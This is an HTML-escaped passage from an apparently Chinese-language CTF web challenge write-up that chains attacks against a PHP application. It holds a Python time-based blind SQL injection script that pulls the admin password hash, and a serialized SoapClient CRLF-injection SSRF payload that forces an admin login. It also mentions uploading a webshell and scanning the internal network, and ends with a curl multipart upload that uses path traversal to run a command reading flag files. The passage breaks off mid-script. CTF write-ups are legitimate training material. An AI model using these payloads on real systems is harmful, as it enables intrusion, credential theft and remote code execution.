&lt;span style="color:#d88200">&amp;#39;signature&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#39;1`,if(ascii(substr((select password from ctf_users where username=`admin`),&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">,1))=&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">,sleep(3),0))#&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è·‘å‡ºæ¥md5è§£å¯†åŽå¾—åˆ°jaivypassword&lt;/p>
&lt;p>æœ‰å¯†ç å’Œè´¦å·å´ç™»ä¸äº†ï¼Œå› ä¸ºä»–åœ¨sqlè¡¨ä¸­è®¾ç½®äº†&lt;code>allow_diff_ip&lt;/code>ï¼Œåªæœ‰ç®¡ç†å‘˜åœ°å€æ‰å¯ä»¥ï¼Œå¹¶ä¸”ä½¿ç”¨äº†&lt;code>$_SERVER['REMOTE_ADDR']&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210093956425.png" alt="image-20211210093956425">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210094111483.png" alt="image-20211210094111483">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210094124067.png" alt="image-20211210094124067">&lt;/p>
&lt;p>æ²¡æ³•xffç»•è¿‡ï¼Œåªèƒ½æ‰¾ä¸€å¤„ssrfçš„ç‚¹ï¼›ä»Žä¹‹å‰çš„phpinfoæ³„éœ²å¯ä»¥çœ‹åˆ°å¼€å¯äº†soapæ‰©å±•ï¼ŒçŽ°åœ¨å°±ç¼ºä¸€ä¸ªååºåˆ—åŒ–ç‚¹äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210095343906.png" alt="image-20211210095343906">&lt;/p>
&lt;p>è¿™é‡Œçš„row[2]å°±æ˜¯moodï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„å‚æ•°ï¼Œå°±æ˜¯æ³¨å…¥ç‚¹äº†&lt;/p>
&lt;p>æ“ä½œçš„æ—¶å€™è¦æ³¨æ„ï¼Œpublishæ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•åŽæ‰èƒ½è¿›è¡Œçš„æ“ä½œï¼Œè€Œæˆ‘ä»¬ä¼ å‚æ˜¯ä¸ºäº†è®©adminå¾—ä»¥ç™»å½•ï¼Œè¿™é‡Œé‡‡å–çš„æ–¹å¼æ˜¯ç”¨å¦ä¸€ä¸ªæœªç™»å½•é¡µé¢çš„cookieçš„codeç”Ÿæˆpayloadï¼Œåœ¨å·²ç™»å½•çš„è´¦å·ä¸Špublishå¹¶è§¦å‘ååºåˆ—åŒ–ï¼Œç„¶åŽä¹‹å‰çš„æœªç™»å½•é¡µé¢åˆ·æ–°å³å¯ç›´æŽ¥è¿›å…¥ä¸ªäººä¿¡æ¯é¡µé¢äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/index.php?action=login&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$post_string&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;username=admin&amp;amp;password=jaivypassword&amp;amp;code=1243998&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;X-Forwarded-For: 127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Cookie: PHPSESSID=meailth0scq7kni7m5ihvr7974&amp;#39;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz^^Content-Type: application/x-www-form-urlencoded^^&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$headers&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^Content-Length: &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$post_string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^^^&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$post_string&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;aaab&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;^^&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210104504684.png" alt="image-20211210104504684">&lt;/p>
&lt;p>ä¹‹åŽadminçš„publishé¡µé¢å¯ä»¥ç›´æŽ¥ä¼ webshellï¼Œæç¤ºflagåœ¨å†…ç½‘ï¼Œç”¨èšå‰‘è¿žæŽ¥æ‰«ä¸€ä¸‹å†…ç½‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210104957446.png" alt="image-20211210104957446">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210105227592.png" alt="image-20211210105227592">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210105526356.png" alt="image-20211210105526356">&lt;/p>
&lt;p>åœ¨å¤–ç½‘å°±å¯ä»¥ç›´æŽ¥è®¿é—®äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210105553912.png" alt="image-20211210105553912">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/var/sandbox/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;prefix&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">]){&lt;/span>
&lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶åå’ŒåŽç¼€åˆ†ç¦»
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æˆ‘ä»¬ä¼ å…¥å’Œæ–‡ä»¶ç±»åž‹fileåŒåçš„æ•°ç»„ file[] 3ä¸ªå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">explode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$ext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å–çš„æ˜¯file[0]
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ext&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]){&lt;/span> &lt;span style="color:#75715e">// filename[count(filename)-1]=file[2]
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;try again!!!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// file[0]=/../amiz.php file[2]=222 file[1]=111
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$new_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">999&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ext&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// éšæœºæ–‡ä»¶å /../è·¯å¾„ç©¿è¶Šç»•è¿‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">move_uploaded_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$new_name&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hello&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#39;@&amp;lt;?php&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// @&amp;lt;?php `find /etc -name *flag* -exec cat {} +`;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$new_name&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can do it!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_name&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// ç»•è¿‡ ../xyz.php æˆ–xyz.php/. ä¸ä¼šè¢«åˆ é™¤
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç»•è¿‡æ–¹å¼å‚è€ƒ-&amp;gt;&lt;a href="https://xi4or0uji.github.io/2018/11/06/2018%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/#web2">2018ä¸Šæµ·web2&lt;/a>&lt;/p>
&lt;p>ç„¶åŽæž„é€ phpçš„curlï¼Œä¸Šä¼ åˆ°uploadå¤„è®©å®ƒè§¦å‘ï¼ˆå¤ªå·§å¦™äº†å§~ ç®€ç›´æ˜¯å¤©ç±~&lt;/p>
&lt;p>æˆ‘çœ‹èµµå¸ˆå‚…æ˜¯ç”¨postmanç›´æŽ¥ç”Ÿæˆçš„payloadï¼Œå¯æ˜¯æˆ‘ç”Ÿæˆçš„è·Ÿä»–çš„ç‰ˆæœ¬çœ‹èµ·æ¥å®Œå…¨ä¸ä¸€æ ·ï¼Œå°‘äº†postè¯¥æœ‰çš„å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚åˆ†å‰²çº¿å•Šï¼Œæ–‡ä»¶ç±»åž‹å’Œå†…å®¹ä»€ä¹ˆçš„ï¼Œä¸çŸ¥é“ä¸ºå•¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211210111755666.png" alt="image-20211210111755666">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://10.0.39.6/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">; filename=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">amiz.php&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n&lt;/span>&lt;span style="color:#d88200">Content-Type: false&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">@&amp;lt;?php echo `find /etc -name *flag* -exec cat {} +`;&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">hello&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">amiz.php&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file[2]&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">222&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file[1]&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">111&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">file[0]&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">/../amiz.php&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">submit&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;\r\n\r\n&lt;/span>&lt;span style="color:#d88200">Submit&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary7MA4YWxkTrZu0gW--&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
